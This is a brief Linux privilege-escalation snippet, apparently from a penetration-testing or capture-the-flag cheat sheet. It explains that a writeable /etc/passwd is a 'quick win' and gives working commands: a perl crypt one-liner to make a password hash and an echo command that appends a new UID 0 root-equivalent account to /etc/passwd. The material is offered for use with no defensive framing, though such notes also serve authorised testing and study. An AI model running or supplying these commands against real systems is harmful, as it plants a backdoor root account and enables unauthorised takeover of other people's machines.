If passwd file is writeable to your user or world, this can be quick win.

- Generate salted hash (This is type of hash passwd accepts)
  - perl -le 'print crypt("myPassHere","addedsalt")'
- write into passwd
  - echo "User:SalTedHasHFromAbove:0:0:User_like_root:/root:/bin/bash" >> /etc/passwd
